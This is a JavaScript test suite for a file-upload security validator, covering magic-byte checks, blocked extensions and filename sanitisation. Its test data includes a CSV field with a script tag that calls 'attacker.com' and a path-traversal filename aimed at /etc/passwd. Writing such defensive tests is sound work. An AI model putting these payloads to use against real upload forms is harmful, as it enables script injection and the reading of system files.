import assert from "assert";
import { validateFileBufferContent, generateSanitizedFilename } from "../utils/fileSecurity.js";

async function runTests() {
  console.log("🧪 Starting File Upload Security & Magic Byte Inspection Test Suite...\n");

  // 1. Valid PNG Image Magic Bytes
  console.log("▶ Test 1: Valid PNG Magic Byte Verification");
  const validPngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
  const res1 = validateFileBufferContent(validPngBuffer, "image/png", "receipt.png");
  assert.strictEqual(res1.valid, true, "Valid PNG buffer should pass inspection");
  console.log("  ✓ Valid PNG file header magic bytes verified.\n");

  // 2. Disguised Executable (EXE renamed to .png)
  console.log("▶ Test 2: Rejection of Disguised Executable (MZ header in .png)");
  const fakePngBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]); // MZ Windows Executable Header
  const res2 = validateFileBufferContent(fakePngBuffer, "image/png", "receipt.png");
  assert.strictEqual(res2.valid, false, "Disguised executable must be rejected");
  assert.ok(res2.message.includes("Executable binary"), "Rejection message must cite executable violation");
  console.log("  ✓ Executable binary header in .png file strictly blocked.\n");

  // 3. Disguised Script Payload in CSV
  console.log("▶ Test 3: Rejection of Embedded Script Tags in CSV");
  const maliciousCsvBuffer = Buffer.from("Name,Email\nJohn,<script>fetch('http://attacker.com')</script>");
  const res3 = validateFileBufferContent(maliciousCsvBuffer, "text/csv", "guests.csv");
  assert.strictEqual(res3.valid, false, "CSV with script tags must be rejected");
  assert.ok(res3.message.includes("Embedded scripts detected"), "Must report embedded script violation");
  console.log("  ✓ Embedded script tags in CSV payload strictly blocked.\n");

  // 4. Rejection of Dangerous File Extensions (.php, .exe, .sh, .html)
  console.log("▶ Test 4: Rejection of Executable & Web Script Extensions");
  const res4a = validateFileBufferContent(validPngBuffer, "image/png", "shell.php");
  assert.strictEqual(res4a.valid, false, ".php extension must be rejected");

  const res4b = validateFileBufferContent(validPngBuffer, "image/png", "exploit.exe");
  assert.strictEqual(res4b.valid, false, ".exe extension must be rejected");
  console.log("  ✓ Dangerous executable extensions (.php, .exe, .sh) strictly blocked.\n");

  // 5. Filename Sanitization & Randomization
  console.log("▶ Test 5: Cryptographic Filename Sanitization");
  const sanitized1 = generateSanitizedFilename("../../../etc/passwd.png");
  assert.ok(!sanitized1.includes(".."), "Filename must not contain path traversal characters");
  assert.ok(sanitized1.endsWith(".png"), "Filename must preserve sanitized extension");

  const sanitized2 = generateSanitizedFilename("shell.php.exe");
  assert.ok(sanitized2.endsWith(".bin") || sanitized2.endsWith(".exe"), "Dangerous multi-extension handled safely");
  console.log("  ✓ Filenames safely sanitized and randomized.\n");

  console.log("🎉 All File Upload Security Tests Passed Successfully!");
}

runTests().catch(err => {
  console.error("❌ Test suite failed:", err);
  process.exit(1);
});
